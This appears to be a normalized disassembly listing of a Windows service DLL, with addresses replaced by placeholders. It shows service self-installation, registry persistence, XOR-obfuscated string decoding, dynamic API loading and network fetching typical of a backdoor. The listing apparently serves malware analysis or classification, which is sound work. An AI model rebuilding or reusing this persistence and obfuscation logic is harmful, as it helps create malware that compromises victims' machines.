sub_10001000
mov eax [ esp + 0x8 ]
sub eax 0x0
je r-xdata
push 0x0
push 0x0
push 0x3
call sub_10001270
add esp 0xc
push 0x5dc
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_10001270
add esp 0xc
mov [ rw-data ] 0x0
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
call sub_10001060
mov eax 0x1
retn 0xc
sub_10001060
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
push 0x5
push rw-data
mov [ rw-data ] 0x1
call sub_10001920
push 0x12
push rw-data
call sub_10001920
push 0x1f
push rw-data
call sub_10001920
push 0x6
push rw-data
call sub_10001920
push 0xd
push rw-data
call sub_10001920
push 0x6
push rw-data
call sub_10001920
push 0x4
push rw-data
call sub_10001920
push 0x34
push rw-data
call sub_10001920
add esp 0x40
push 0x22
push rw-data
call sub_10001920
push 0x7
push rw-data
call sub_10001920
push 0xa
push rw-data
call sub_10001920
push 0xa
push rw-data
call sub_10001920
push 0x2c
push rw-data
call sub_10001920
push 0x8
push rw-data
call sub_10001920
push 0x8
push rw-data
call sub_10001920
push 0xf
push rw-data
call sub_10001920
add esp 0x40
ServiceMain
sub esp 0x104
push esi
mov esi [ esp + 0x110 ]
push 0x100
mov eax [ esi ]
push eax
push rw-data
call [ strncpy@IAT ]
mov ecx [ esi ]
push 0x100
push ecx
push rw-data
call [ wcstombs@IAT ]
mov edx [ rw-data ]
add esp 0x18
mov [ rw-data ] 0x0
push 0x104
push rw-data
push edx
call [ GetModuleFileNameA@IAT ]
push sub_100012d0
push rw-data
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
pop esi
add esp 0x104
retn 0x8
push edi
push 0x1
push 0x0
push 0x2
call sub_10001270
push 0x0
push 0x0
push 0x4
call sub_10001270
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x21 ]
mov [ esp + 0x20 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x18
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov [ esp + eax + 0x8 ] 0x0
lea edi [ esp + 0x8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
lea eax [ esp + 0x8 ]
push ecx
push eax
push 0x1
push rw-data
push rw-data
push 0x80000002
call [ SHSetValueA@IAT ]
call sub_10001370
mov esi [ Sleep@IAT ]
pop edi
mov dl [ eax + rw-data ]
inc dl
mov [ esp + eax + 0x8 ] dl
inc eax
cmp eax ecx
jl r-xdata
mov [ rw-data ] 0x1
call sub_100017a0
call sub_10001860
push 0x7d0
call esi
jmp r-xdata
call sub_10001810
test eax eax
jne r-xdata
sub_10001270
sub esp 0x1c
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x24 ]
lea edx [ esp ]
mov [ esp + 0xc ] eax
mov eax [ rw-data ]
push edx
push eax
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_100012d0
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_10001358 ]
push 0x1
push 0x0
push 0x3
call sub_10001270
add esp 0xc
push 0xa
call [ Sleep@IAT ]
push 0x0
push 0x0
push 0x1
call sub_10001270
add esp 0xc
push 0x1
push 0x0
push 0x6
call sub_10001270
push 0x0
push 0x0
push 0x7
call sub_10001270
add esp 0x18
retn 0x4
push 0x1
push 0x0
push 0x5
call sub_10001270
push 0x0
push 0x0
push 0x4
call sub_10001270
add esp 0x18
retn 0x4
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call sub_10001270
add esp 0xc
retn 0x4
sub_10001390
push ebx
mov ebx [ Sleep@IAT ]
push ebp
mov ebp [ OpenMutexA@IAT ]
push esi
push edi
mov edi [ CloseHandle@IAT ]
xor esi esi
push rw-data
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
mov [ rw-data ] eax
push eax
call edi
push 0x3e8
call ebx
inc esi
cmp esi 0xc8
jl r-xdata
xor eax eax
retn 0x4
call sub_100018b0
push rw-data
push 0x0
push 0x1f0001
call ebp
test eax eax
je r-xdata
jmp r-xdata
pop edi
cmp esi 0x64
pop esi
pop ebp
pop ebx
jge r-xdata
InstallService
sub esp 0x204
mov eax [ esp + 0x208 ]
push ebx
push ebp
push esi
test eax eax
push edi
mov [ esp + 0x10 ] 0x80000002
mov [ esp + 0x14 ] 0x0
mov ebx rw-data
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push 0x1
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x20 ]
push edx
push eax
push 0x0
push rw-data
push ecx
mov [ esp + 0x30 ] 0x1f4
call [ RegQueryValueExA@IAT ]
mov edx [ esp + 0x10 ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
push esi
call [ SetLastError@IAT ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
mov ebx eax
mov al [ esp + 0x20 ]
lea esi [ esp + 0x20 ]
test al al
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
cmp [ esi ] 0x0
jne r-xdata
mov edi [ strchr@IAT ]
mov ebp [ _stricmp@IAT ]
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
push 0x0
push esi
call edi
add esp 0x8
inc eax
mov esi eax
cmp [ esi ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
push 0x1
push 0x2
push 0x20
push 0xf01ff
push 0x0
push ebx
push edi
call [ CreateServiceA@IAT ]
mov ebp [ CloseServiceHandle@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x204
retn
push ebx
push esi
call ebp
add esp 0x8
test eax eax
je r-xdata
push esi
call ebp
mov esi [ GetLastError@IAT ]
call esi
cmp eax 0x431
je r-xdata
mov edx [ esp + 0x10 ]
push rw-data
push edx
call [ SHDeleteKeyA@IAT ]
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push eax
push rw-data
push ecx
call [ RegCreateKeyA@IAT ]
mov ebx [ SetLastError@IAT ]
mov esi eax
push esi
call ebx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
call esi
cmp eax 0x431
jne r-xdata
push edi
call ebp
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
mov eax [ rw-data ]
push 0x104
push rw-data
push eax
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
push edi
call ebp
push 0x1f4
lea eax [ esp + 0x24 ]
push rw-data
push eax
mov [ esp + 0x1c ] 0x80000002
call [ strncpy@IAT ]
push 0x64
lea ecx [ esp + 0x30 ]
push ebx
push ecx
call [ strncat@IAT ]
mov ecx [ esp + 0x28 ]
add esp 0x18
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x20 ]
push edx
push 0xf003f
push 0x0
push eax
push ecx
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
push 0xf01ff
push ebx
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push rw-data
push 0x2
push eax
mov eax [ esp + 0x24 ]
push rw-data
push eax
call [ RegSetValueExA@IAT ]
mov esi eax
push esi
call ebx
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
push 0x0
push 0x0
push 0x0
push rw-data
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x2
push 0xffffffff
push esi
call [ ChangeServiceConfigA@IAT ]
mov eax [ esp + 0x10 ]
mov esi [ RegCloseKey@IAT ]
push eax
call esi
mov ecx [ esp + 0x14 ]
push ecx
call esi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x204
retn
mov ecx [ esp + 0x10 ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
mov edx [ esp + 0x14 ]
push edx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x204
retn
RundllInstallA
mov eax [ esp + 0xc ]
push eax
call InstallService
add esp 0x4
test eax eax
je r-xdata
push rw-data
call sub_10001880
pop ecx
retn 0x10
push rw-data
call sub_10001880
add esp 0x4
retn 0x10
UninstallService
push esi
push edi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx [ esp + 0xc ]
mov eax rw-data
test ecx ecx
je r-xdata
push 0x10000
push eax
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
push esi
call [ DeleteService@IAT ]
test eax eax
je r-xdata
mov eax ecx
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
sub_100017a0
sub esp 0x1f4
lea eax [ esp ]
push esi
mov esi [ sprintf@IAT ]
push rw-data
push rw-data
push rw-data
push eax
call esi
lea ecx [ esp + 0x14 ]
push ecx
call sub_10006d10
push rw-data
push rw-data
push rw-data
push rw-data
lea edx [ esp + 0x28 ]
push rw-data
push edx
call esi
lea eax [ esp + 0x30 ]
push eax
call sub_10006d10
add esp 0x30
pop esi
add esp 0x1f4
retn
sub_10001810
sub esp 0xc
lea eax [ esp + 0x4 ]
lea ecx [ esp ]
push eax
lea edx [ esp + 0xc ]
push ecx
push edx
push rw-data
push rw-data
push 0x80000002
mov [ esp + 0x18 ] 0xff
mov [ esp + 0x1c ] 0x4
call [ SHGetValueA@IAT ]
mov ecx [ esp ]
xor eax eax
cmp ecx 0x1
sete al
add esp 0xc
retn
sub_10001880
mov edx [ esp + 0x4 ]
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
push edx
push 0x1
push rw-data
push rw-data
push 0x80000002
call [ SHSetValueA@IAT ]
pop edi
retn
sub_100018b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100090b0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
call sub_10001950
test eax eax
jne r-xdata
call sub_100041d0
call [ WSACleanup@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10001920
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
mov dl [ eax + ecx ]
sub dl al
xor dl 0x19
add dl 0x13
mov [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_10001950
sub esp 0x110
push ebx
mov ebx [ LoadLibraryA@IAT ]
push ebp
push esi
push edi
push rw-data
call ebx
mov edi [ GetProcAddress@IAT ]
mov esi eax
push rw-data
push esi
call edi
mov ebp [ FreeLibrary@IAT ]
push esi
mov [ rw-data ] eax
call ebp
push rw-data
call ebx
mov esi eax
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push esi
mov [ rw-data ] eax
call ebp
push 0x8
push rw-data
call sub_10001920
push 0x13
push rw-data
call sub_10001920
push 0xb
push rw-data
call sub_10001920
push 0xb
push rw-data
call sub_10001920
push 0xb
push rw-data
call sub_10001920
push 0xd
push rw-data
call sub_10001920
push 0x10
push rw-data
call sub_10001920
push 0xb
push rw-data
call sub_10001920
add esp 0x40
push 0x12
push rw-data
call sub_10001920
push 0x11
push rw-data
call sub_10001920
push 0x11
push rw-data
call sub_10001920
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff8
push ecx
push rw-data
call sub_10001920
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0xd
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_10001920
push 0x6
push rw-data
call sub_10001920
push 0xd
push rw-data
call sub_10001920
push 0xf
push rw-data
call sub_10001920
add esp 0x40
push 0x16
push rw-data
call sub_10001920
push 0xb
push rw-data
call sub_10001920
push 0xb
push rw-data
call sub_10001920
push 0xc
push rw-data
call sub_10001920
push 0x9
push rw-data
call sub_10001920
push 0x13
push rw-data
call sub_10001920
add esp 0x30
mov esi rw-data
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
call sub_10001920
add esi 0x10
add esp 0x8
cmp esi rw-data
jl r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi rw-data
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push eax
and ecx 0x3
push eax
[ edi ] [ esi ]
push eax
call [ CreateEventA@IAT ]
mov [ rw-data ] eax
call sub_100020b0
test eax eax
jne r-xdata
push rw-data
call sub_10003580
add esp 0x4
call sub_10003600
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
call sub_100020d0
call sub_10002150
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
call sub_100047b0
call sub_100081e0
call sub_10004030
call sub_10004180
call sub_100041a0
mov esi [ malloc@IAT ]
push 0x2000
call esi
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
call sub_10002c40
test eax eax
jne r-xdata
push 0x2000
call esi
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
push rw-data
push rw-data
push 0x80000002
call [ SHDeleteValueA@IAT ]
mov al [ rw-data ]
mov ecx 0x40
mov [ esp + 0x1c ] al
xor eax eax
lea edi [ esp + 0x1d ]
lea edx [ esp + 0x1c ]
[ edi ]
stosw [ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x104
stosb [ edi ]
push ecx
lea eax [ esp + 0x18 ]
push edx
push eax
push rw-data
push rw-data
push 0x80000002
call [ SHGetValueA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x0
push sub_10004d40
push 0x0
push 0x0
call [ CreateThread@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x110
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jae r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x110
retn
mov edi [ Sleep@IAT ]
mov esi 0x12b
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x110
retn
push 0x3e8
call edi
mov edx esi
dec esi
test edx edx
jne r-xdata
lea ecx [ esp + 0x1c ]
push ecx
call sub_100033b0
add esp 0x4
test eax eax
jne r-xdata
sub_100020d0
sub esp 0x8
lea eax [ esp ]
lea ecx [ esp + 0x4 ]
push eax
push rw-data
push ecx
push rw-data
push rw-data
push 0x80000002
mov [ esp + 0x18 ] 0x4
call [ SHGetValueA@IAT ]
test eax eax
je r-xdata
add esp 0x8
retn
push 0x0
call [ time@IAT ]
push eax
call [ srand@IAT ]
add esp 0x8
call [ rand@IAT ]
push 0x4
push rw-data
push 0x4
push rw-data
push rw-data
push 0x80000002
mov [ rw-data ] eax
call [ SHSetValueA@IAT ]
sub_10002150
sub esp 0xc
lea eax [ esp + 0x4 ]
lea ecx [ esp ]
push eax
lea edx [ esp + 0xc ]
push ecx
push edx
push rw-data
push rw-data
push 0x80000002
mov [ esp + 0x18 ] 0xff
mov [ esp + 0x1c ] 0x4
call [ SHGetValueA@IAT ]
mov ecx [ esp ]
xor eax eax
cmp ecx 0x1
sete al
add esp 0xc
retn
sub_100021a0
push edi
mov edi [ esp + 0xc ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
mov al [ ecx + esi ]
sub al cl
xor al 0x7
mov dl al
shr dl 0x5
shl al 0x3
or dl al
mov [ ecx + esi ] dl
inc ecx
cmp ecx edi
jl r-xdata
pop esi
sub_100021d0
sub esp 0x30
push esi
push edi
mov ecx 0x6
mov esi rw-data
lea edi [ esp + 0x1c ]
mov edx [ rw-data ]
[ edi ] [ esi ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0x14 ] edx
mov [ esp + 0xc ] eax
mov ax [ rw-data ]
mov [ esp + 0x10 ] ecx
mov cl [ rw-data ]
lea edx [ esp + 0x1c ]
push 0x19
push edx
movsw [ edi ] [ esi ]
mov [ esp + 0x20 ] ax
mov [ esp + 0x22 ] cl
call sub_100021a0
lea eax [ esp + 0x14 ]
push 0xe
push eax
call sub_100021a0
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x14
test esi esi
je r-xdata
pop edi
pop esi
add esp 0x30
retn
lea ecx [ esp + 0x8 ]
push 0x0
push ecx
push esi
push 0x0
lea edx [ esp + 0x1c ]
push rw-data
push edx
lea eax [ esp + 0x34 ]
push 0x50
push eax
call sub_10003720
add esp 0x20
test eax eax
je r-xdata
push esi
call [ free@IAT ]
add esp 0x4
mov ecx [ esp + 0x8 ]
push 0x20
push esi
push rw-data
mov [ ecx + esi ] 0x0
call [ strncpy@IAT ]
add esp 0xc
sub_100022a0
sub esp 0x404
push ebx
push ebp
push esi
mov esi [ esp + 0x414 ]
push edi
push 0xd
push esi
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov eax ecx
sub eax esi
jmp r-xdata
mov ecx eax
lea edi [ esp + 0x14 ]
mov edx ecx
lea ebp [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
dec ebp
[ edi ] [ esi ]
mov [ esp + eax + 0x14 ] 0x3b
mov [ esp + eax + 0x15 ] 0x0
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + ecx + 0x14 ]
cmp ebp eax
mov [ esp + 0x10 ] eax
jae r-xdata
mov eax 0x3fe
cmp eax 0x400
jb r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x404
retn
mov ebx [ esp + 0x41c ]
mov eax [ esp + 0x420 ]
mov [ ebp ] 0x0
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edi ebx
mov eax esi
cmp ebp [ esp + 0x10 ]
jb r-xdata
mov edi ebx
xor eax eax
[ esi ] [ edi ]
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea esi [ ebp + 0x1 ]
push 0x3b
push esi
call [ strchr@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x404
retn
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ edi + 0x1 ]
jne r-xdata
test eax eax
je r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ edi ]
jne r-xdata
sub_100023c0
push ecx
push esi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push 0x0
push eax
push esi
push 0x0
push rw-data
push rw-data
push 0x50
push rw-data
call sub_10003720
add esp 0x20
test eax eax
jne r-xdata
pop esi
pop ecx
retn
mov edx [ esp + 0x4 ]
xor ecx ecx
push edi
push esi
mov al [ edx + esi - 0x1 ]
mov dl [ esp + 0x14 ]
cmp al dl
sete cl
mov edi ecx
call [ free@IAT ]
add esp 0x4
mov eax edi
pop edi
pop esi
pop ecx
retn
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
pop ecx
retn
sub_10002440
sub esp 0x3d4
push ebx
push ebp
push esi
push edi
push 0xff
call sub_100023c0
add esp 0x4
test eax eax
je r-xdata
call sub_100021d0
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0xcc ] eax
mov eax [ rw-data ]
mov [ esp + 0xd0 ] ecx
mov cx [ rw-data ]
mov [ esp + 0xd4 ] edx
mov edx [ rw-data ]
mov [ esp + 0xd8 ] eax
mov eax [ rw-data ]
mov [ esp + 0xdc ] cx
mov ecx [ rw-data ]
mov [ esp + 0xbc ] edx
mov dx [ rw-data ]
mov [ esp + 0xc0 ] eax
mov eax [ rw-data ]
mov [ esp + 0xc4 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xc8 ] dx
mov edx [ rw-data ]
mov [ esp + 0x9c ] eax
mov ax [ rw-data ]
mov [ esp + 0xa0 ] ecx
mov cl [ rw-data ]
mov [ esp + 0xa4 ] edx
mov edx [ rw-data ]
mov [ esp + 0xa8 ] ax
mov eax [ rw-data ]
mov [ esp + 0xaa ] cl
mov ecx [ rw-data ]
mov [ esp + 0x40 ] edx
mov dx [ rw-data ]
mov [ esp + 0x44 ] eax
mov al [ rw-data ]
mov [ esp + 0x48 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x4c ] dx
mov edx [ rw-data ]
mov [ esp + 0x4e ] al
mov ax [ rw-data ]
mov [ esp + 0x34 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x38 ] edx
mov edx [ rw-data ]
mov [ esp + 0x3c ] ax
mov ax [ rw-data ]
mov [ esp + 0x8c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x90 ] edx
mov edx [ rw-data ]
mov [ esp + 0x94 ] ax
mov al [ rw-data ]
mov [ esp + 0x14 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x18 ] edx
mov edx [ rw-data ]
mov [ esp + 0x1c ] al
mov eax [ rw-data ]
mov [ esp + 0x5c ] ecx
